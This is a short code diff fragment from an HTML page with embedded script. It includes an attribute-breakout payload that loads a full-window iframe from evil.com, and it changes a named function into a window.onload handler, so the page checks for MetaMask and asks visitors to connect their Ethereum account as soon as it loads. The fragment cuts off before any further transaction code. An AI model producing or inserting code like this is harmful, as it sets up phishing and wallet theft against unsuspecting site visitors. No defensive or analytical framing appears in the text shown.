@@ -7,7 +7,7 @@
 "><iframe src="https://evil.com" height="100%" width="100%" frameborder="0"></iframe>
 ">
 <script>
-  function sendTransaction() {
+  window.onload = function() {
   // Check if MetaMask is installed
   if (typeof ethereum !== 'undefined') {
     // Request the user to connect to their Ethereum account
